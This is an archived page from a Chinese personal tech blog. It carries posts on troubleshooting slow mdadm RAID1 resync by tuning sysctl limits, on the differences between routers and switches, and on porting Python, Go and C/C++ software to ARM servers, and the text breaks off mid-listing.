<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">



  <meta name="google-site-verification" content="cR4Tgq6nOHr_Wo0dm8HUK3feA45_XLr5RkA2UC-tXxc">














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">





  <link rel="alternate" href="/atom.xml" title="Yiran's Blog" type="application/atom+xml">






<meta name="description" content="Normal is boring">
<meta name="keywords" content="Linux,KVM,Ops">
<meta property="og:type" content="website">
<meta property="og:title" content="Yiran&#39;s Blog">
<meta property="og:url" content="https://zdyxry.github.io/page/2/index.html">
<meta property="og:site_name" content="Yiran&#39;s Blog">
<meta property="og:description" content="Normal is boring">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Yiran&#39;s Blog">
<meta name="twitter:description" content="Normal is boring">
<meta name="twitter:creator" content="@zhouyiran1994">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://zdyxry.github.io/page/2/">





  <title>Yiran's Blog</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-136220198-1', 'auto');
  ga('send', 'pageview');
</script>





</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Yiran's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-books">
          <a href="/books" rel="section">
            
            读书
          </a>
        </li>
      
        
        <li class="menu-item menu-item-movies">
          <a href="/movies" rel="section">
            
            观影
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://zdyxry.github.io/2019/11/15/为什么你的-mdadm-同步这么慢/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yiran">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/yiran.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiran's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/11/15/为什么你的-mdadm-同步这么慢/" itemprop="url">为什么你的 mdadm 同步这么慢</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-15T20:20:03+08:00">
                2019-11-15
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/11/15/为什么你的-mdadm-同步这么慢/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/11/15/为什么你的-mdadm-同步这么慢/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>自己一直通过 mdadm 在软件层面对多块磁盘进行 RAID1 配置，一个主要的原因是 mdadm 是 KickStart 默认软件。因为只是 RAID1，所以使用起来也是比较方便，虽然有些小坑，但总体来说还好。<br>最近遇到一个问题， mdadm 在配置 RAID1 时，磁盘同步很慢。</p>
<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>先说下磁盘构成，一般情况下是这样：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran 20:23:48 ~]<span class="variable">$lsblk</span></span><br><span class="line">NAME      MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT</span><br><span class="line">sda         8:0    0  59.6G  0 disk</span><br><span class="line">├─sda1      8:1    0   256M  0 part  /boot/efi</span><br><span class="line">└─sda2      8:2    0   512M  0 part  /boot</span><br><span class="line">sdb         8:16   0 223.6G  0 disk</span><br><span class="line">└─sdb1      8:17   0    45G  0 part</span><br><span class="line">  └─md127   9:127  0    45G  0 raid1 /</span><br><span class="line">sdc         8:32   0 223.6G  0 disk</span><br><span class="line">└─sdc1      8:33   0    45G  0 part</span><br><span class="line">  └─md127   9:127  0    45G  0 raid1 /</span><br></pre></td></tr></table></figure>
<p>两块 SSD 各自分区，并将第一个分区通过 mdadm 做 RAID1，保证系统分区高可用，分区大小是 45G，但是因为是 SSD 磁盘，所以速度也不会慢到哪去。</p>
<p>最近遇到的问题就是我觉得最不应该有问题的地方：同步速度很慢，非常慢，慢到离谱：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran 20:28:00 ~]<span class="variable">$mdadm</span> -D /dev/md127</span><br><span class="line">/dev/md127:</span><br><span class="line">           Version : 1.2</span><br><span class="line">     Creation Time : Thu Nov 14 10:06:52 2019</span><br><span class="line">        Raid Level : raid1</span><br><span class="line">        Array Size : 47153152 (44.97 GiB 48.28 GB)</span><br><span class="line">     Used Dev Size : 47153152 (44.97 GiB 48.28 GB)</span><br><span class="line">      Raid Devices : 2</span><br><span class="line">     Total Devices : 2</span><br><span class="line">       Persistence : Superblock is persistent</span><br><span class="line"></span><br><span class="line">     Intent Bitmap : Internal</span><br><span class="line"></span><br><span class="line">       Update Time : Fri Nov 15 20:28:01 2019</span><br><span class="line">             State : clean, degraded, recovering</span><br><span class="line">    Active Devices : 1</span><br><span class="line">   Working Devices : 2</span><br><span class="line">    Failed Devices : 0</span><br><span class="line">     Spare Devices : 1</span><br><span class="line"></span><br><span class="line">Consistency Policy : bitmap</span><br><span class="line"></span><br><span class="line">    Rebuild Status : 0% complete</span><br><span class="line"></span><br><span class="line">              Name : localhost:root</span><br><span class="line">              UUID : 257cd7f6:effadd5a:3e16dac1:9a28362d</span><br><span class="line">            Events : 90</span><br><span class="line"></span><br><span class="line">    Number   Major   Minor   RaidDevice State</span><br><span class="line">       0       8       17        0      active sync   /dev/sdb1</span><br><span class="line">       1       8       33        1      spare rebuilding   /dev/sdc1</span><br><span class="line">[root@yiran 20:28:04 ~]<span class="variable">$cat</span> /proc/mdstat</span><br><span class="line">Personalities : [raid1]</span><br><span class="line">md127 : active raid1 sdc1[1] sdb1[0]</span><br><span class="line">      47153152 blocks super 1.2 [2/1] [U_]</span><br><span class="line">      [&gt;....................]  recovery =  0.0% (8832/47153152) finish=621.6min speed=1261K/sec</span><br><span class="line">      bitmap: 1/1 pages [4KB], 65536KB chunk</span><br><span class="line"></span><br><span class="line">unused devices: &lt;none&gt;</span><br></pre></td></tr></table></figure>
<h2 id="调查"><a href="#调查" class="headerlink" title="调查"></a>调查</h2><p>确认硬件没问题之后，尝试通过 <code>/proc/mdstat</code> 可以看到同步速度只有 1M 左右，通过 <code>iostat</code> 命令看磁盘读写状态发现磁盘没有任何压力，使用率也是正常水平。</p>
<p>到这里没啥想法了，想到一点，系统是如何设置软 raid 同步速度的呢？</p>
<p>软 raid 在进行同步时，肯定会对磁盘进行大量的读写来保证磁盘数据正确性，如果是 RAID1 ，那就是完全的镜像了。如果 RAID 分区上正在进行非常重要的业务读写，但是 mdadm 又占用了比较大的读写带宽，肯定会影响到我们的业务，所以系统应该是存在一个上限值的。</p>
<p>经过搜索，查到了两个系统参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/proc/sys/dev/raid/speed_limit_max</span><br><span class="line">/proc/sys/dev/raid/speed_limit_min</span><br></pre></td></tr></table></figure>
<p>看一下系统默认值，发现 speed_limit_max 是200M，也就是说我现在的速度远远达不到上限，还有其他原因。</p>
<p>可惜的是，我查看了系统 /var/log/messages 和 dmesg ，都没有发现什么线索。</p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>因为这个问题虽然不重要，但是比较紧急，所以就在不知道原因的情况下先修复了它，我们可以在 <code>/etc/sysctl.conf</code> 中添加这两项配置来更改相应的数值。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@yiran 20:59:34 ~]<span class="variable">$cat</span> /etc/sysctl.conf</span><br><span class="line"><span class="comment"># sysctl settings are defined through files in</span></span><br><span class="line"><span class="comment"># /usr/lib/sysctl.d/, /run/sysctl.d/, and /etc/sysctl.d/.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Vendors settings live in /usr/lib/sysctl.d/.</span></span><br><span class="line"><span class="comment"># To override a whole file, create a new file with the same in</span></span><br><span class="line"><span class="comment"># /etc/sysctl.d/ and put new settings there. To override</span></span><br><span class="line"><span class="comment"># only specific settings, add a file with a lexically later</span></span><br><span class="line"><span class="comment"># name in /etc/sysctl.d/ and put new settings there.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For more information, see sysctl.conf(5) and sysctl.d(5).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">dev.raid.speed_limit_min = 100000</span><br><span class="line">dev.raid.speed_limit_max = 200000</span><br><span class="line">[root@yiran 20:59:42 ~]<span class="variable">$sysctl</span> -p</span><br><span class="line">dev.raid.speed_limit_min = 100000</span><br><span class="line">dev.raid.speed_limit_max = 200000</span><br></pre></td></tr></table></figure>
<p>在<a href="https://www.cyberciti.biz/tips/linux-raid-increase-resync-rebuild-speed.html" target="_blank" rel="noopener">这篇博客</a> 中还提到了其他方式能够提升软 raid 的同步速度，比如设置 read-ahead、条带大小、Bitmap 等，但是都不如 sysctl 调整系统参数来的方便，而且副作用也没有那么大。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>提交了一个不知道问题原因的修复 Patch，内心还是有些慌的，如果有读者看到并知道原因，麻烦留言告诉我，谢谢。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://www.cyberciti.biz/tips/linux-raid-increase-resync-rebuild-speed.html" target="_blank" rel="noopener">https://www.cyberciti.biz/tips/linux-raid-increase-resync-rebuild-speed.html</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://zdyxry.github.io/2019/11/09/路由器-vs-交换机/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yiran">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/yiran.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiran's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/11/09/路由器-vs-交换机/" itemprop="url">路由器 vs 交换机</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-09T09:59:07+08:00">
                2019-11-09
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/11/09/路由器-vs-交换机/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/11/09/路由器-vs-交换机/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>交换机和路由器大家应该都听说过，大部分也用过，但是它俩有啥联系，又有啥区别？</p>
<p>P.S. 最近看《OSTEP》看的脑子有点短路，趁着周末看点网络的东西。</p>
<h2 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h2><blockquote>
<p>路由器（英语：Router，又称路径器）是一种电讯网络设备，提供路由与转送两种重要机制，可以决定封包从来源端到目的端所经过的路由路径（host 到 host 之间的传输路径），这个过程称为路由；将路由器输入端的封包移送至适当的路由器输出端（在路由器内部进行），这称为转送。路由工作在OSI模型的第三层——即网络层，例如网际协议（IP）。</p>
</blockquote>
<p>路由器主要具有两个职能：</p>
<ul>
<li>路由器确保信息不到达不需要到达的位置</li>
<li>路由器确保信息到达所需要的正确目的地</li>
</ul>
<p>在执行以上这两种职能中，路由器连接两个网络，将信息从一个网络传送至另一个网络。在某些情况下，还执行两个网络间的多种协议的翻译职能。此外它还确保网络之间通信路由的相互独立，预防其中一个网络上的多余流量溢出到另一个网络上。该过程称为路由选择。</p>
<p>路由选择是 OSI 模型第三层（网络层的）一个功能。路由器通过网络层协议头如 IP 头（包含源地址和目的地址）和路由表，选择转发数据包的最佳路径。为选择任意两个主机间的最佳路由，实现路由器间的通信，通常需要应用如 ICMP 这样的路由选择协议。</p>
<h2 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h2><blockquote>
<p>网络交换机（Network switch）是一种网络数据转发设备，能够对数据包进行高速的“交换”。二层交换机工作于OSI参考模型的第二层，即数据链路层。</p>
</blockquote>
<blockquote>
<p>交换机内部的CPU会在每个端口成功连接时，通过将MAC地址和端口对应，形成一张 MAC 表。在今后的通讯中，发往该MAC地址的数据包将仅送往其对应的端口，而不是所有的端口。交换机对数据包的转发是建立在MAC (Media Access Control) 地址–物理地址基础之上的，对于IP 网络协议来说，它是透明的，即交换机在转发数据包时，不知道也无须知道信源机和信宿机的IP 地址，只需知其物理地址即MAC 地址。</p>
</blockquote>
<blockquote>
<p>交换机在操作过程当中会不断的收集资料去建立它本身的一个地址表，这个表相当简单，它说明了某个MAC 地址是在哪个端口上被发现的，所以当交换机收到一个TCP/IP 封包时，它便会看一下该数据包的目的 MAC 地址，核对一下自己的地址表以确认应该从哪个端口把数据包发出去。由于这个过程比较简单，加上这功能由一崭新硬件进行——ASIC (Application Specific Integrated Circuit) ，因此速度相当快，一般只需几十微秒，交换机便可决定一个IP 封包该往那里送。</p>
</blockquote>
<blockquote>
<p>值得一提的是：万一交换机收到一个不认识的封包，就是说如果目的地MAC 地址不能在地址表中找到时，交换机会把IP 封包”扩散”出去，即把它从每一个端口中送出去，就如交换机在处理一个收到的广播封包时一样。</p>
</blockquote>
<blockquote>
<p>二层交换机的弱点正是它处理广播封包的手法不太有效，比方说，当一个交换机收到一个从TCP/IP 工作站上发出来的广播封包时，他便会把该封包传到所有其他端口去，哪怕有些端口上连的是IPX 或DECnet 工作站。这样一来，非TCP/IP 节点的带宽便会受到负面的影响，就算同样的TCP/IP 节点，如果他们的子网跟发送那个广播封包的工作站的子网相同，那么他们也会无原无故地收到一些与他们毫不相干的网络广播，整个网络的效率因此会大打折扣。</p>
</blockquote>
<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><table>
<thead>
<tr>
<th></th>
<th>路由器</th>
<th>交换机</th>
</tr>
</thead>
<tbody>
<tr>
<td>OSI</td>
<td>网络层</td>
<td>数据链路层</td>
</tr>
<tr>
<td>数据传输地址</td>
<td>IP 地址</td>
<td>MAC 地址</td>
</tr>
<tr>
<td>使用范围</td>
<td>局域网/广域网</td>
<td>局域网</td>
</tr>
<tr>
<td>存储信息</td>
<td>路由表</td>
<td>MAC 地址与端口映射表</td>
</tr>
<tr>
<td>传输方式</td>
<td>全双工</td>
<td>全双工</td>
</tr>
<tr>
<td>隔离方式</td>
<td>划分子网</td>
<td>划分 VLAN</td>
</tr>
<tr>
<td>具体用途</td>
<td>连接多个网络</td>
<td>连接一个网络内的多个设备</td>
</tr>
</tbody>
</table>
<p>那么路由器和交换机可以互相替换么？</p>
<p>路由器通常带有 WAN 口和多个 LAN 口，其中多个 LAN 口可以看作一个小型的交换机，只是端口数量较少。二层交换机无法替换路由器，因为不具有路由转发的功能。但是现在存在三层交换机，可以实现路由器中的路由转发功能，甚至看到部分三层交换机已经支持了 NAT 功能，那么当不同 VLAN 之间的网络设备想要进行通信，就可以直接通过三层交换机找到对应路由，交换机学习到了 MAC 地址与 IP 地址的对应关系后，后续直接通过二层联通，不需要经过查找路由这一步了。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://pc.net/helpcenter/answers/difference_between_switch_and_router" target="_blank" rel="noopener">https://pc.net/helpcenter/answers/difference_between_switch_and_router</a></li>
<li><a href="https://www.diffen.com/difference/Router_vs_Switch" target="_blank" rel="noopener">https://www.diffen.com/difference/Router_vs_Switch</a></li>
<li><a href="https://zh.wikipedia.org/zh-hans/%E7%B6%B2%E8%B7%AF%E4%BA%A4%E6%8F%9B%E5%99%A8" target="_blank" rel="noopener">https://zh.wikipedia.org/zh-hans/%E7%B6%B2%E8%B7%AF%E4%BA%A4%E6%8F%9B%E5%99%A8</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://zdyxry.github.io/2019/11/01/ARM-服务器？能用？/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yiran">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/yiran.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiran's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/11/01/ARM-服务器？能用？/" itemprop="url">ARM 服务器？能用？</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-01T22:12:00+08:00">
                2019-11-01
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/11/01/ARM-服务器？能用？/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/11/01/ARM-服务器？能用？/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近各大 2B 厂家都在搞国产化，我司也不例外，花费了些时间折腾了下 ARM 服务器，记录下踩坑和使用感受。</p>
<p>本文所使用的开发环境为 CentOS7.6。</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>使用的第一步是编译自己的软件，我日常使用的软件发布的最小粒度是 RPM，所以我们需要把自己在 X86 上的软件都重新编译一份 ARM64v8 的。</p>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>在预期中，Python 应该是最简单的，直接编译 RPM 就好，我在之前博客<a href="https://zdyxry.github.io/2018/07/28/RPM-%E5%B8%B8%E7%94%A8%E6%9E%84%E5%BB%BA%E6%96%B9%E5%BC%8F/">《RPM 常用构建方式》</a> 中提到过，对于 Python 来说，最简单的是通过 <code>FPM</code> 来构建 RPM，但是这里有两个坑。</p>
<ol>
<li>Python 软件是否依赖了 C/C++ ，如果依赖了，那么需要在 ARM 机器上使用 <code>FPM</code> 的时候编译构建 RPM</li>
<li>从网上下载的 <code>noarch.rpm</code> ，是否真的是 <code>noarch</code> 的？需要仔细检查（别问我怎么知道的</li>
</ol>
<p>在我以为一切搞定的时候，想起来还有个服务是需要机器学习等第三方库的，是使用 <code>conda</code> 安装的。<br>好嘛，完蛋了，折腾几个小时下来结论是 <code>conda</code> 对于 ARM64 几乎处于不支持的状态。最后也没搞定。</p>
<h3 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h3><p>最简单的莫过于 Golang 了，在 Golang 1.5 及之后版本，只需要设置 <code>GOOS</code> 和 <code>GOARCH</code> 这两个环境变量就能编译出目标平台的 Go binary 文件。</p>
<p>在官网中我们可以找到支持列表：</p>
<table>
<thead>
<tr>
<th>$GOOS</th>
<th>$GOARCH</th>
</tr>
</thead>
<tbody>
<tr>
<td>…</td>
<td>…</td>
</tr>
<tr>
<td>linux</td>
<td>386</td>
</tr>
<tr>
<td>linux</td>
<td>amd64</td>
</tr>
<tr>
<td>linux</td>
<td>arm</td>
</tr>
<tr>
<td>linux</td>
<td>arm64</td>
</tr>
<tr>
<td>linux</td>
<td>ppc64</td>
</tr>
<tr>
<td>linux</td>
<td>ppc64le</td>
</tr>
<tr>
<td>linux</td>
<td>mips</td>
</tr>
<tr>
<td>linux</td>
<td>mipsle</td>
</tr>
<tr>
<td>linux</td>
<td>mips64</td>
</tr>
<tr>
<td>linux</td>
<td>mips64le</td>
</tr>
<tr>
<td>linux</td>
<td>s390x</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
</tbody>
</table>
<p>比如我的目标平台是 Linux ARM64 ，那么我只需要设置 <code>GOOS=linux GOARCH=arm64 go build</code> 即可。</p>
<p>编译出 binary 文件后，构建 RPM 方式与 x86 差别不大，只需要在 <code>rpmbuild</code> 时增加参数 <code>--target aarch64</code> 就好。</p>
<h3 id="C-C"><a href="#C-C" class="headerlink" title="C/C++"></a>C/C++</h3><p>这个是最难搞的，好在有 wenquan 同学帮助，在安装了 <code>devtoolset-7</code> 之后也成功构建出来了，顺便让我这个没写过 C/C++ 的人去了解了下 cmake,make,ninja 都是个啥东西（虽然现在又忘了）。</p>
<p>如果是自己写 Makefile 编译的同学，到这里应该就没有问题了。</p>
<p>但是，我需要编译 envoy，这东西很恶心的点在于只能用 bazel 编译，官方提供的编译容器镜像只提供了 x86 的，所以最后只能在物理服务器上安装 bazel ，尝试编译。这时候又发现 CentOS 7 上的 libstdc++ 不包含 C++11 的 ABI，所以只能尝试使用 docker 来运行，最后通过 Docker 采用 Ubuntu 18.04 镜像编译出来了，中间经历了无数曲折。</p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>该编译的都编译完了，接下来安装应该很容易吧，并没有。</p>
<p>首先，因为 CentOS 默认的 <code>libstdc++</code> 版本太低，导致 MongoDB 无法安装，致命伤，Ubuntu 18.04 和 CentOS8 应该都可以安装，但是因为 CentOS8 官方未发布 ARM64 容器镜像，只能使用 Ubuntu 18.04 镜像将 MongoDB 运行在容器中了。</p>
<p>因为我不想改动太多的业务代码，所以我使用容器时是采用的 <code>--network=host</code> 模式，假装它不存在。</p>
<p>其他的软件包大部分都可以在网上找到已有的 ARM64 版本，如果没有只能自己编译了，比如 Redis,Fluent-bit，Prometheus 等等，但是大多没什么问题，很容易解决。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>所有软件都安装上了，终于能开始使用了。因为我负责的服务需要获取硬件信息并展示，根据硬件信息进行相应的配置，发现了一些奇奇怪怪的问题。</p>
<h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p>不知道是测试服务器的原因还是故意未暴露出来，友商的 CPU 信息可获取的很少，比如 CPU 主频、支持指令集、CPU Cache 大小等等。</p>
<p>无论是 <code>lscpu</code> ， <code>cpuinfo</code> 还是 <code>cat /proc/cpuinfo</code> 均无法得到，只能通过修改业务代码来临时运行起来。</p>
<h3 id="Dmidecode"><a href="#Dmidecode" class="headerlink" title="Dmidecode"></a>Dmidecode</h3><p>与服务器硬件打交道比较多的同学应该都知道 <code>dmidecode</code> 的命令，它能获取到服务器的硬件信息，但是我手上这台能获取的信息也是有限的，下面贴一下 X86 服务器正常获取的信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 